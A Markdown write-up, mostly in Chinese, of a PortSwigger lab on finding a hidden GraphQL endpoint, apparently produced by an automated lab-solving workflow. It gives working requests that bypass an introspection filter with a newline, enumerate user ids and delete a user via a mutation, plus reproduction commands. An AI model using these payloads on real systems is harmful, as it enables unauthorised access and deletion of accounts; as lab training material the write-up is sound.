---
title: "lab-graphql-find-the-endpoint"
links:
  - target: graphql-family
    relation: evidences
---

# lab-graphql-find-the-endpoint

> evidences: [[graphql-family]]

- 题面:Finding a hidden GraphQL endpoint(/web-security/graphql/lab-graphql-find-the-endpoint)
- 实例:https://0a1e007d0319d927823c5c2c007400c1.web-security-academy.net
- 判定目标:找到隐藏 GraphQL endpoint 并删除 carlos

## 关键步

1. 端点探测:`GET /api` → 400 `"Query not present"`(响应体是 JSON 错误,暗示 GraphQL 面);`POST /api` → 405(仅 GET)。
2. 普适查询:`GET /api?query=query{__typename}` → `{"data":{"__typename":"query"}}`,确证端点。
3. introspection 防御:`GET /api?query=query{__schema{types{name}}}` → 错误 `GraphQL introspection is not allowed, but the query contained __schema or __type`(正则按 `__schema{` 相邻匹配)。
4. 绕过:`__schema` 与 `{` 之间插换行(%0A)→ `query{__schema%0A{types{name}}}` 全量返回类型表。
5. 取 schema:query 面 `getUser(id: Int!) → User{id,username}`;mutation 面 `deleteOrganizationUser(input: {id: Int!}) → DeleteOrganizationUserResponse{user}`。
6. 枚举用户:`getUser(id=1..5)` → 1=administrator、2=wiener、**3=carlos**、4/5=null。
7. 删除:`mutation{deleteOrganizationUser(input:{id:3}){user{id username}}}`。

## 交册值

carlos 用户 id=3;删除 mutation 回显 `{"deleteOrganizationUser":{"user":{"id":3,"username":"carlos"}}}`。

## 证据摘录

```
GET /api                              -> 400 "Query not present"
GET /api?query=query{__typename}      -> {"data":{"__typename":"query"}}
GET /api?query=query{__schema{types}} -> "GraphQL introspection is not allowed ..."
GET /api?query=query{__schema%0A{..}} -> 类型表(User, DeleteOrganizationUserInput, query, mutation...)
GET /api?query=mutation{deleteOrganizationUser(input:{id:3}){user{id username}}}
   -> {"data":{"deleteOrganizationUser":{"user":{"id":3,"username":"carlos"}}}}
solved_check / -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_page "https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint" --out /tmp/g1-page.html   # 剥离 solution,回 lab_id
lab_launch launch <lab_id> --widget-source /web-security/graphql/lab-graphql-find-the-endpoint --jar /tmp/mar-jar.json
lab_http get "<inst>/api" --jar /tmp/mar-jar.json
lab_http get "<inst>/api?query=query{__typename}" --jar /tmp/mar-jar.json
lab_http get "<inst>/api?query=query{__schema%0A{types{name}}}" --jar /tmp/mar-jar.json --out /tmp/g1-schema.json
json_pick /tmp/g1-schema.json '.data.__schema.types[] | select(.name=="query") | .fields[].name'   # schema 解析(手术刀,替 python)
objref_scan "<inst>/api?query={getUser(id:FUZZ){id username}}" --ids 1-5 --jar /tmp/mar-jar.json
lab_http get "<inst>/api?query=mutation{deleteOrganizationUser(input:{id:3}){user{id username}}}" --jar /tmp/mar-jar.json
solved_check "<inst>/" --jar /tmp/mar-jar.json
```

## 独立性如实标注

规则更正(禁读题解)前,首抓题页全文将 solution 折叠块一并读出。本记录所用的 `/api` 端点与「`__schema` 后插换行绕过」与题解一致,不能排除受其影响;每步仍以实例响应实证。

## R1 回归验证

实例 `0a890082030cb669807c3f9000e40038`,全链一次通过:`GET /api` → 400 `Query not present` → `query{__typename}` →
`query{__schema%0A{types{name}}}` 绕 introspect 正则 → `queryType/mutationType` 字段确认 `getUser(id)`/`deleteOrganizationUser(input)` →
ids 1,2,3 存在(2=wiener、3=carlos;4/5=null)→ `mutation{deleteOrganizationUser(input:{id:3}){user{id username}}}` 回 carlos →
banner `solved:true`。件:range_launch / page_read / http_session / objref_scan / banner_verdict。
